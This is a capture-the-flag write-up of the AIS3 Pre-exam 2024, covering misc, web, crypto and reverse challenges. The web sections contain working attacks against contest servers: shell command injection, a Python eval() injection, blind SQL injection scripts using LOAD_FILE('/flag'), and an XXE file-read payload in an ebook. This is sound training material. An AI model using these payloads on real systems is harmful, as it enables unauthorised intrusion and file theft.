
AIS3 Pre-exam CTF 2024 writeup
===

# Table of Contents

[TOC]

# Misc
## Welcome 
![image](https://hackmd.io/_uploads/SJ_vtx1V0.png)

### Welcome Solution
### Get FLAG
**FLAG: AIS3{Welc0me_to_AIS3_PreExam_2o24!}**

## Three Dimensional Secret
![image](https://hackmd.io/_uploads/r13Znf140.png)

給了一個pcapng
![image](https://hackmd.io/_uploads/H12OnzkEC.png)

### Three Dimensional Secret Solution
TCP Stream 中一大串G code
```
;FLAVOR:Marlin
;TIME:788
;Filament used: 8.45726m
;Layer height: 10
;MINX:58.496
;MINY:58.537
;MINZ:10
;MAXX:241.742
;MAXY:241.259
;MAXZ:10
;TARGET_MACHINE.NAME:Creality Ender-3 Max
;Generated with Cura_SteamEngine 5.6.0
M140 S60
M105
M190 S60
M104 S200
M105
M109 S200
M82 ;absolute extrusion mode
; Ender 3 Max Custom Start G-code
G92 E0 ; Reset Extruder
G28 ; Home all axes
G1 Z2.0 F3000 ; Move Z Axis up little to prevent scratching of Heat Bed
G1 X0.1 Y20 Z0.3 F5000.0 ; Move to start position
G1 X0.1 Y200.0 Z0.3 F1500.0 E15 ; Draw the first line
G1 X0.4 Y200.0 Z0.3 F5000.0 ; Move to side a little
G1 X0.4 Y20 Z0.3 F1500.0 E30 ; Draw the second line
G92 E0 ; Reset Extruder
G1 Z2.0 F3000 ; Move Z Axis up little to prevent scratching of Heat Bed
G1 X5 Y20 Z0.3 F5000.0 ; Move over to prevent blob squish
G92 E0
G92 E0
G1 F1500 E-6.5
;LAYER_COUNT:1
;LAYER:0
M107
G0 F6000 X112.332 Y147.783 Z10
;TYPE:SKIRT
G1 F1500 E0
G1 F1200 X113.079 Y147.223 E1.55258
G1 X113.47 Y146.956 E2.33996
G1 X114.19 Y146.505 E3.75283
G1 X116.867 Y144.974 E8.88134
G1 X118.944 Y143.698 E12.93516
G1 X121.09 Y142.298 E17.19626
G1 X123.156 Y140.864 E21.37855
G1 X124.111 Y140.161 E23.35062
G1 X124.258 Y140.063 E23.64443
G1 X125.264 Y139.326 E25.71833
G1 X125.734 Y139.001 E26.66861
G1 X126.281 Y138.644 E27.75487
G1 X128.402 Y137.222 E32.00148
G1 X130.461 Y135.755 E36.20582
G1 X132.479 Y134.23 E40.41225
```
搜尋: Gcode online tool
#### ncviewer exe. GCode file
![image](https://hackmd.io/_uploads/Bym01HkVA.png)
> 產生一個炫砲的東西

![image](https://hackmd.io/_uploads/BkvzxSJE0.png)
### Get FLAG
**FLAG: AIS3{b4d1y_tun3d_PriN73r}**

## Quantum Nim Heist
![image](https://hackmd.io/_uploads/SkgQkz1VR.png)
> nc chals1.ais3.org 40004

### Quantum Nim Heist Solution
>[!Note]
> 需要拿走最後一個棋，才能獲勝取得flag

> nc chals1.ais3.org 40004

![image](https://hackmd.io/_uploads/HkDWXPxEA.png)

我先做了一次合法的移動
```
it's your turn to move! what do you choose? 0
which pile do you choose? 1
how many stones do you remove? 1
```
![image](https://hackmd.io/_uploads/ryG08PxN0.png)

> 一直ENTER，讓機器拿到剩最後一個

![image](https://hackmd.io/_uploads/S1hQvve4R.png)

拿走最後一顆棋
```
+--------------------- moved ---------------------+
| you removed 1 stones from pile 1                |
+---+-------------- stones info ------------------+
| 0 | o                                           |
| 1 | o                                           |
+--------------------- moved ---------------------+
| i removed 1 stones from pile 1                  |
+---+-------------- stones info ------------------+
| 0 | o                                           |
+---+--------------- game menu -------------------+
| 0 | make a move                                 |
| 1 | save the current game and leave             |
| 2 | resign the game                             |
+---+---------------------------------------------+
it's your turn to move! what do you choose? 0
which pile do you choose? 0
how many stones do you remove? 1
```
![image](https://hackmd.io/_uploads/Sy2wwwxNA.png)

### Get FLAG
**FLAG: AIS3{Ar3_y0u_a_N1m_ma57er_0r_a_Crypt0_ma57er?}**

## Emoji Console
![image](https://hackmd.io/_uploads/BJQjODx4C.png)

http://chals1.ais3.org:5000/
![image](https://hackmd.io/_uploads/SkYhdPgE0.png)

### Emoji Console Solution
Execute Command
> ℹ️ 🅰️Ⓜ️ 🔼🐍 ⭐➖⭐

![image](https://hackmd.io/_uploads/SJcztwl4C.png)
```
GET /api?command=%E2%84%B9%EF%B8%8F%20%F0%9F%85%B0%EF%B8%8F%E2%93%82%EF%B8%8F%20%F0%9F%94%BC%F0%9F%90%8D%20%E2%AD%90%E2%9E%96%E2%AD%90 HTTP/1.1
Host: chals1.ais3.org:5000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Accept: */*
Referer: http://chals1.ais3.org:5000/
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```
> 結論:
> 不能有字元，只能使用Emoji 執行

#### 1. 🆔= Command: id
![image](https://hackmd.io/_uploads/SJDSCDxNA.png)
> uid=0(root) gid=0(root) groups=0(root)

#### 2. 🐱 🚩= Command: cat flag
![image](https://hackmd.io/_uploads/SJn3aDx4R.png)
> cat: flag: Is a directory

#### Note 🐍 ➖Ⓜ️ 🚩= Command: python -m flag
![image](https://hackmd.io/_uploads/B1T76wgEA.png)
> /usr/local/bin/python: No module named flag.__ main__; 'flag' is a package and cannot be directly executed

#### 3. 💿 🚩 😜 = Command: cd flag ;p
![image](https://hackmd.io/_uploads/B1hvZOgN0.png)
> /bin/sh: 1: p: not found
> 成功

#### 4. 💿 🚩 😜 😑 🆔 = Command: cd flag ;p :| id
>uid=0(root) gid=0(root) groups=0(root)

> [!TIP]
> "|" 可以bypass | 前的指令，多出來的 p :

![image](https://hackmd.io/_uploads/BJUhJKxN0.png)
#### 5. 💿 🚩 😜 😑 🐱 ⭐ = Command: cd flag ;p :| cat *
![image](https://hackmd.io/_uploads/H1W4WtgN0.png)
> #flag-printer.py
print(open('/flag','r').read())

> 有線索了。
> 執行 flag-printer.py

#### 6. 💿 🚩 😜 😑 🐍 🚩⭐ = Command: cd flag ;p :| python flag* 
![image](https://hackmd.io/_uploads/BJ7FGteVA.png)
```
AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}
```
> 詭異了?!

```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Sun, 26 May 2024 09:37:08 GMT
Content-Type: application/json
Content-Length: 195
Connection: close

{"command":"cd flag ;p :| python flag*","result":"AIS3{\ud83e\udef5\ud83e\udea1\ud83c\ude50\ud83e\udd19\ud83e\udd19\ud83e\udd19\ud83d\udc49\ud83d\udc49\ud83d\udea9\ud83d\udc48\ud83d\udc48}\n\n"}

```
>想多了\
>直接複製貼上就可

### Get FLAG
**FLAG: AIS3{🫵🪡🉐🤙🤙🤙👉👉🚩👈👈}**


# Web
## Evil Calculator
![image](https://hackmd.io/_uploads/rkx0KeJN0.png)

http://chals1.ais3.org:5001 \
![image](https://hackmd.io/_uploads/rknv9l14R.png)

### Evil Calculator Solution
> 55688*9

```
POST /calculate HTTP/1.1
Host: chals1.ais3.org:5001
Content-Length: 24
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://chals1.ais3.org:5001
Referer: http://chals1.ais3.org:5001/
Accept-Encoding: gzip, deflate
Accept-Language: zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{"expression":"55688*9"}
```
#### Code Review
index.html
```html=73
<script>
  let expressionScreen = document.getElementById('expression'); 

  function appendToExpression(char) { //目前顯示表達式
    expressionScreen.value = expressionScreen.value === '0' ? char : expressionScreen.value + char;
  }

  function clearExpression() {
    expressionScreen.value = '0';
  }

  function calculate() { //使用 Fetch API call /calculate
    const expression = expressionScreen.value;
    fetch('/calculate', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({expression: expression}),
    })
    .then(response => response.json())
    .then(data => {
      expressionScreen.value = data.result;
    })
    .catch((error) => {
      console.error('Error:', error);
      expressionScreen.value = 'Error';
    });
  }
</script>
```

app.py
```python=
from flask import Flask, request, jsonify, render_template

app = Flask(__name__)

@app.route('/calculate', methods=['POST']) //POST JSON格式，eval()執行
def calculate():
    data = request.json
    expression = data['expression'].replace(" ","").replace("_","")
    try:
        result = eval(expression)
    except Exception as e:
        result = str(e)
    return jsonify(result=str(result))

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run("0.0.0.0",5001)

```

#### 1. 加入分號 ";"
```
{"expression":"8+9;"}
```
![image](https://hackmd.io/_uploads/SJ3GIZk4A.png)

> "result":"invalid syntax (<string>, line 1)"

#### 2. 加入逗號 ","
```
"expression":"8+9,print('CHW')"
```

![image](https://hackmd.io/_uploads/ryMDY-yNA.png)

> 成功執行
    
#### 3. Bypass 空格 & __
##### 3.1 python __ import__('subprocess') 先擺一邊
##### 3.2 嘗試file()
```
"expression":"8+9,file('flag.txt').read()"
```
回應
```
"result":"name 'file' is not defined"
```
> 嘗試其他函數
##### 3.2 嘗試open()
```
"expression":"8+9,open('flag.txt').read()"
```
回應:
```
"result":"[Errno 2] No such file or directory: 'flag.txt'"
```
> 代表 open() 可以執行
找 檔案位置
##### 3.3 更改檔案路徑
```
"expression":"8+9,open('/flag').read()"
```
![image](https://hackmd.io/_uploads/BJvCFfkN0.png)

### Get FLAG
**FLAG: AIS3{7RiANG13_5NAK3_I5_50_3Vi1}**

## It's MyGO!!!!!
![image](https://hackmd.io/_uploads/BJzOsWJEC.png)\
http://chals1.ais3.org:11454 

![image](https://hackmd.io/_uploads/SJKqo-kV0.png)

簡介:\
http://chals1.ais3.org:11454/#intro \
成員介紹:\
http://chals1.ais3.org:11454/#members \
原創曲:\
http://chals1.ais3.org:11454/#songs

### It's MyGO!!!!! Solution
原創曲: http://chals1.ais3.org:11454/#songs
![image](https://hackmd.io/_uploads/HytQa-y4A.png)
> <<迷星叫>>: http://chals1.ais3.org:11454/song?id=1 \
> <<迷路日々>>: http://chals1.ais3.org:11454/song?id=2 \
> <<碧天伴走>>: http://chals1.ais3.org:11454/song?id=3 \
> <<春日影>>: http://chals1.ais3.org:11454/song?id=4
    
http://chals1.ais3.org:11454/song?id=5
![image](https://hackmd.io/_uploads/HyOa6WyNC.png)

```
HTTP/1.1 304 Not Modified
X-Powered-By: Express
ETag: W/"1ce-E8tYwjH5/hmxMrE8bCoPavlhCP4"
Date: Sat, 25 May 2024 07:05:10 GMT
Connection: close
```
#### ' 會被擋
http://chals1.ais3.org:11454/song?id=%22
> 沒有回應
    
#### Blind sql injections
根據這篇文獻:https://owasp.org/www-community/attacks/Blind_SQL_Injection
測試是否 Blind sql injections
1. (Blind-boolean-based SQLi): AND 1=1
![image](https://hackmd.io/_uploads/rJwjypgVA.png)
> 2%20AND%201=1
> 正常顯示

2. (Blind-boolean-based SQLi): AND 1 = 2
![image](https://hackmd.io/_uploads/SJh3kal4A.png)
> 2%20AND%201=2
> 200 No Data //異常

3. (Blind-time-based SQLi): AND IF(1=1, SLEEP(5), 0)
> 延遲5秒
    
![image](https://hackmd.io/_uploads/BJhjU2gEC.png)
> 2%20AND%20IF(1=1,+SLEEP(5),+0)
> 延遲5秒 200 

4. (Blind-time-based SQLi): AND IF(1=2, SLEEP(5), 0)
> 不會延遲5秒，if 不成立

![image](https://hackmd.io/_uploads/Hy_ePhgV0.png)
> 2%20AND%20IF(1=2,+SLEEP(5),+0)
> 200 正常

#### (1) AND IF(ASCII(SUBSTRING(LOAD_FILE('/flag'), 2, 1)) = 65, 1, 0) --
測試/flag 第一個字元是否'A'
> 1+AND+IF(ASCII(SUBSTRING(LOAD_FILE('/flag'),1,1))=65,1,0)+--  

![image](https://hackmd.io/_uploads/BkJveTl4A.png)
> 確定第一個字元為'A'

#### Python exploit
根據上面判斷方式，寫腳本測試所有ASCII
##### 1. exploitASCII.py
```python=
import requests

# 目標URL
url = 'http://chals1.ais3.org:11454/song?id=1'
# 文件路徑
file_path = '/flag'
# 已知的flag，預設空字串
flag = ''

# 字元範圍
char_range = list(range(32, 127))  # 基本ASCII字符範圍
char_range += [ord(c) for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}']  # 增加更多常用字元符號

# 確認的標誌，當條件為True時，網頁回應中的標誌
true_indicator = 'MyGO!!!!!<br>'  # 當條件為True時回應中的標誌 (成功才會顯示MyGO!!!!!<br>)

print("開始讀取flag...")

# 存儲所有滿足條件的flag
flags = []

# 從第1個字元開始猜測
i = 1

while True:
    found_char = False

    for c in char_range:
        payload = f"+AND+IF(ASCII(SUBSTRING(LOAD_FILE('{file_path}'),{i},1))={c},1,0)+-- "
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'close'
        }
        r = requests.get(url + payload, headers=headers)

        if true_indicator in r.text:
            flag += chr(c)
            flags.append(flag)  # 將符合條件的flag存儲在列表中
            print(f'找到第{i}個字符: {chr(c)}')
            found_char = True
            break

    if not found_char:
        print('找不到更多字符，結束')
        break

    i += 1

print('讀取的flag:', flags)

```
```
python3 exploitASCII.py
```
![image](https://hackmd.io/_uploads/SJhSvx-NC.png)

> AIS3{CRYCHIC_Funeral_
> 得到一半的Flag

>[!Tip]
> 題目提示: charset: unicode
 

    
在 i=22後(第22個字元後)
我直接把ASCII 改成UNICODE

##### 2. exploitUnicode.py
```python=
import requests

# 目標URL
url = 'http://chals1.ais3.org:11454/song?id=1'
# 文件路徑
file_path = '/flag'
# 已知的flag，預設空字串
flag = ''

# 字元範圍
char_range = list(range(0x0000, 0xFFFF)) 

# 確認的標誌，當條件為True時，網頁回應中的標誌
true_indicator = 'MyGO!!!!!<br>'

print("開始讀取flag...")

# 存儲所有滿足條件的flag
flags = []

# 從第22個字元開始猜測
i = 22

while True:
    found_char = False

    for c in char_range:
        hex_value = format(c, 'X')
        payload = f"+AND+IF(HEX(SUBSTRING(LOAD_FILE('{file_path}'),{i},1))='{hex_value}',SLEEP(5),0)+-- "
        headers = {
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7',
            'Connection': 'close'
        }
        r = requests.get(url + payload, headers=headers)

        if r.elapsed.total_seconds() >= 5:
            flag += chr(c)
            flags.append(flag)  # 將符合條件的flag存儲在列表中
            print(f'找到第{i}個字符: U+{ord(chr(c)):04x}')
            found_char = True
            break

    if not found_char:
        print('找不到更多字符，結束')
        break

    i += 1

print('讀取的flag:', flags)

```
###### 2.1 輸出字元: 一堆阿拉伯文
###### 2.2 輸出UTF-8:
```
找到第22個字符: b'\xc3\xb0'
找到第23個字符: b'\xc2\x9f'
找到第24個字符: b'\xc2\x98'
找到第25個字符: b'\xc2\xad'
找到第26個字符: b'\xc3\xb0'
找到第27個字符: b'\xc2\x9f'
找到第28個字符: b'\xc2\x8e'
找到第29個字符: b'\xc2\xb8'
找到第30個字符: b'\xc3\xb0'
找到第31個字符: b'\xc2\x9f'
找到第32個字符: b'\xc2\x98'
找到第33個字符: b'\xc2\xad'
找到第34個字符: b'\xc3\xb0'
找到第35個字符: b'\xc2\x9f'
找到第36個字符: b'\xc2\x8e'
找到第37個字符: b'\xc2\xb8'
找到第38個字符: b'\xc3\xb0'
找到第39個字符: b'\xc2\x9f'
找到第40個字符: b'\xc2\x98'
找到第41個字符: b'\xc2\xad'
找到第42個字符: b'\xc3\xae'
找到第43個字符: b'\xc2\x9f'
找到第44個字符: b'\xc2\x8e'
找到第45個字符: b'\xc2\xa4'
找到第46個字符: b'\x00'
找到第47個字符: b'\xc2\x9f'
找到第48個字符: b'\xc2\x98'
找到第49個字符: b'\xc2\xad'
找到第50個字符: b'\xc3\xb0'
找到第51個字符: b'\xc2\x9f'
找到第52個字符: b'\xc2\xa5'
找到第53個字符: b'\xc2\x81'
找到第54個字符: b'\xc3\xb0'
找到第55個字符: b'\xc2\x9f'
找到第56個字符: b'\xc2\x98'
找到第57個字符: b'\xc2\xb8'
找到第58個字符: b'\xc3\xb0'
找到第59個字符: b'\xc2\x9f'
找到第60個字符: b'\xc2\x8e'
找到第61個字符: b'\xc2\xb8'
找到第62個字符: b'}'
```
###### 2.3 輸出Unicode:
```
開始讀取flag...
找到第22個字符: U+00f0
找到第23個字符: U+009f
找到第24個字符: U+0098
找到第25個字符: U+00ad
找到第26個字符: U+00f0
找到第27個字符: U+009f
找到第28個字符: U+008e
找到第29個字符: U+00b8
找到第30個字符: U+00f0
找到第31個字符: U+009f
找到第32個字符: U+0098
找到第33個字符: U+00ad
找到第34個字符: U+00f0
找到第35個字符: U+009f
找到第36個字符: U+008e
找到第37個字符: U+00b8
找到第38個字符: U+00f0
找到第39個字符: U+009f
找到第40個字符: U+0098
找到第41個字符: U+00ad
找到第42個字符: U+00f0
找到第43個字符: U+009f
找到第44個字符: U+008e
找到第45個字符: U+00a4
找到第46個字符: U+00f0
找到第47個字符: U+009f
找到第48個字符: U+0098
找到第49個字符: U+00ad
找到第50個字符: U+00f0
找到第51個字符: U+009f
找到第52個字符: U+00a5
找到第53個字符: U+0081
找到第54個字符: U+00f0
找到第55個字符: U+009f
找到第56個字符: U+0098
找到第57個字符: U+00b8
找到第58個字符: U+00f0
找到第59個字符: U+009f
找到第60個字符: U+008e
找到第61個字符: U+00b8
找到第62個字符: U+007d
```
> 實在無解，開Ticket。
> ![image](https://hackmd.io/_uploads/rJvEIFHNR.png)
> (ChatGPT)四個一組轉UTF-8\
> ![image](https://hackmd.io/_uploads/HydyaIW4R.png)

```
U+00f0 U+009f U+0098 U+00ad😭
U+00f0 U+009f U+008e U+00b8🎸
U+00f0 U+009f U+0098 U+00ad😭
U+00f0 U+009f U+008e U+00b8🎸
U+00f0 U+009f U+0098 U+00ad😭
U+00f0 U+009f U+008e U+00a4🎤
U+00f0 U+009f U+0098 U+00ad😭
U+00f0 U+009f U+00a5 U+0081🥁
U+00f0 U+009f U+0098 U+00b8😸
U+00f0 U+009f U+008e U+00b8🎸
U+007d
```

### Get FLAG
**FLAG: AIS3{CRYCHIC_Funeral_😭🎸😭🎸😭🎤😭🥁😸🎸}**
    
## Ebook Parser
![image](https://hackmd.io/_uploads/S1afcE14A.png)

http://chals1.ais3.org:8888/
![image](https://hackmd.io/_uploads/BJvzOob4A.png)

### Ebook Parser Solution
Code Review: app.py
```python=
import tempfile
import pathlib
import secrets

from os import getenv, path

import ebookmeta

from flask import Flask, request, jsonify
from flask.helpers import send_from_directory

app = Flask(__name__, static_folder='static/')
app.config['JSON_AS_ASCII'] = False
app.config['MAX_CONTENT_LENGTH'] = 1024 * 1024

@app.route('/', methods=["GET"])
def index():
    return send_from_directory('static', 'index.html')


@app.route('/parse', methods=["POST"])
def upload():
    if 'ebook' not in request.files:
        return jsonify({'error': 'No File!'})

    file = request.files['ebook']

    with tempfile.TemporaryDirectory() as directory:
        suffix = pathlib.Path(file.filename).suffix
        fp = path.join(directory, f"{secrets.token_hex(8)}{suffix}")
        file.save(fp)
        app.logger.info(fp)

        try:
            meta = ebookmeta.get_metadata(fp)
            return jsonify({'message': "\n".join([
                f"Title: {meta.title}",
                f"Author: {meta.author_list_to_string()}",
                f"Lang: {meta.lang}",
            ])})
        except Exception as e:
            print(e)
            return jsonify({'error': f"{e.__class__.__name__}: {str(e)}"}), 500


if __name__ == "__main__":
    port = getenv("PORT", 8888)
    app.run(host="0.0.0.0", port=port)
```
> 使用到ebookmeta

ebookmeta的漏洞在比賽第二天有人在github提出issue:
https://github.com/dnkorpushov/ebookmeta/issues/16
>[!Important]
>甚至提供了 exploit

![image](https://hackmd.io/_uploads/Bk4xKj-EA.png)

修改payload.fb2
```xml=
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ 
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///flag" >
]>
<FictionBook xmlns="http://www.gribuser.ru/xml/fictionbook/2.0" xmlns:l="http://www.w3.org/1999/xlink">
<description>
    <title-info>
        <genre>antique</genre>
        <author><first-name></first-name><last-name>&xxe;</last-name></author>
        <book-title>&xxe;</book-title>
        <lang>&xxe;</lang>
    </title-info>
    <document-info>
        <author><first-name></first-name><last-name>Unknown</last-name></author>
        <program-used>calibre 6.13.0</program-used>
        <date>26.5.2024</date>
        <id>eb5cbf82-22b5-4331-8009-551a95342ea0</id>
        <version>1.0</version>
    </document-info>
    <publish-info>
    </publish-info>
</description>
<body>
<section>
<p>&lt;root&gt;</p>
<p>12345</p>
<p>&lt;/root&gt;</p>
</section>
</body>
</FictionBook>

```
> 上傳

![image](https://hackmd.io/_uploads/H1UoYo-EA.png)
### Get FLAG
**FLAG: AIS3{LP#1742885: lxml no longer expands external entities (XXE) by default}**

# Crypto

## babyRSA
![image](https://hackmd.io/_uploads/H1ZXk71VA.png)

### babyRSA Solution
babyRSA.py
```python=
import random
from Crypto.Util.number import getPrime
from secret import flag
def gcd(a, b):
    while b:
        a, b = b, a % b
    return a

def generate_keypair(keysize):
    p = getPrime(keysize)
    q = getPrime(keysize)
    n = p * q
    phi = (p-1) * (q-1)
    
    e = random.randrange(1, phi)
    g = gcd(e, phi)
    while g != 1:
        e = random.randrange(1, phi)
        g = gcd(e, phi)
    d = pow(e, -1, phi)
    return ((e, n), (d, n))

def encrypt(pk, plaintext):
    key, n = pk
    cipher = [pow(ord(char), key, n) for char in plaintext]
    return cipher

def decrypt(pk, ciphertext):
    key, n = pk
    plain = [chr(pow(char, key, n)) for char in ciphertext]
    return ''.join(plain)

public, private = generate_keypair(512)
encrypted_msg = encrypt(public, flag)
decrypted_msg = decrypt(private, encrypted_msg)

print("Public Key:", public)
print("Encrypted:", encrypted_msg)
# print("Decrypted:", decrypted_msg)
```

>[!Note]
> 題目透過ASCII直接做RSA加密
> 解: 利用所有RSA加密，去比對題目的密文

#### 1. ASCII rsa encryption
寫一個ASCII RSA加密檔
encry.py
```
def encrypt_all_ascii(pk):
    key, n = pk
    with open("ASCIIencry.txt", "w") as file:
        for char in range(128):  # 所有 ASCII 字符的範圍是 0 到 127
            cipher = pow(char, key, n)
            file.write(f"Character: {chr(char)}, Encrypted: {cipher}\n")

# 使用公鑰 (e, n) 來加密所有 ASCII 字符
public_key = (64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649)
encrypt_all_ascii(public_key)

```
產出ASCIIencry.txt
![image](https://hackmd.io/_uploads/S15zTXJVC.png)

#### 2. 比對加密字元
![image](https://hackmd.io/_uploads/rylCPEyN0.png)
### Get FLAG
**FLAG: AIS3{NeverUseTheCryptographyLibraryImplementedYourSelf}**


# Reverse

## The Long Print
(忘了截圖)
作者提供一個 ELF format binary: flag-printer-dist
### The Long Print Solution
#### 1. IDA
用 IDA 8.3 開啟\
![image](https://hackmd.io/_uploads/B1Q8kIKIR.png)

![image](https://hackmd.io/_uploads/HyLHjSKUA.png)

#### 2. 對 main function Decompile
在 main function (按F5): Decompile ，可以看到 Pseudocode
```Pseudocode=
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v4; // [rsp+4h] [rbp-Ch]
  int i; // [rsp+8h] [rbp-8h]
  int j; // [rsp+Ch] [rbp-4h]

  puts("Hope you have enough time to receive my flag:");
  for ( i = 0; i <= 23; i += 2 )
  {
    v4 = *(_DWORD *)&secret[4 * i] ^ key[*(unsigned int *)&secret[4 * i + 4]];
    for ( j = 0; j <= 3; ++j )
    {
      sleep(0x3674u);
      printf("%c", v4);
      v4 >>= 8;
      fflush(_bss_start);
    }
  }
  puts("\rOops! Where is the flag? I am sure that the flag is already printed!");
  return 0;
}
```
> &secret[4 * i] 與 key[*&secret[4 * i + 4]] 做XOR 存在 v4\
> sleep(0x3674u) 睡死了
#### 3. Edit Patch Bytes
在 sleep() 更改 Patch Bytes
![image](https://hackmd.io/_uploads/rJxgeLFIR.png)
> 將 1 移至 EDI暫存器\
> BF 01 00 00 00 E8 7B FE FF FF 8B 45 F4 89 C6 48
####  4. Apply patches to input file
```Pseudocode=11
   for ( j = 0; j <= 3; ++j )
    {
      sleep(1u);
      printf("%c", v4);
      v4 >>= 8;
      fflush(_bss_start);
    }
```
>[!Note]
> Edit > Patch Program > Apply patches to input file 
> 可以直接儲存更改後的內容    

### Get FLAG  
```
./flag-printer-dist
```
![image](https://hackmd.io/_uploads/rk-XS8K8C.png)

**FLAG: AIS3{You_are_the_master_of_time_management!!!!?**

# FINAL
![image](https://hackmd.io/_uploads/rJMiO6ZEC.png)
![image](https://hackmd.io/_uploads/rJE8_6-E0.png)




